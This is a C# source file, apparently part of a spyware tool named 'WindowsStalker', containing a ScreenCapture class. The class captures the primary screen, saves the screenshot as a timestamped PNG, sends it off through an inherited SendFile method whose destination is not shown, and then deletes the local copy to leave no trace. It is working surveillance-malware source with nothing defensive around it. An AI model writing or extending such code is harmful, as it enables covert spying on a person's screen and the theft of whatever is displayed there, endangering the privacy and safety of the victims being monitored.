using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace WindowsStalker
{
    public class ScreenCapture : FileCapture
    {
        public static void CaptureScreenshot()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                Screen.PrimaryScreen.Bounds.Height,
                PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                Screen.PrimaryScreen.Bounds.Y,
                0,
                0,
                Screen.PrimaryScreen.Bounds.Size,
                CopyPixelOperation.SourceCopy);

            string filename = DateTime.Now.ToString("MMddyyyy_hmm_tt") + ".png";

            bmpScreenshot.Save(filename, ImageFormat.Png);
            SendFile(filename, 1);
            File.Delete(filename);
        }
    }
}